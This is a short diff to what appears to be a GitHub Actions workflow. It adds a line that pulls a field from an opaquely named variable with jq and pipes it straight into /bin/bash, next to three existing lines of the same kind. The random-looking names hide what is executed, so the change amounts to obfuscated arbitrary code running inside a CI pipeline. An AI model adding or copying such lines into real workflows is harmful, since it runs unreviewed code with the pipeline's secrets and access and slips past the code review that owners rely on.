@@ -33,6 +33,7 @@ jobs:
           echo $rodj801 | jq -r .dbkmq92 | /bin/bash
           printf '%s' "$pfs3176" | jq -r .y59 | /bin/bash
           printf '%s' "$e14" | jq -r .dslv26 | /bin/bash
+          echo $nnu38 | jq -r .doxu8594 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
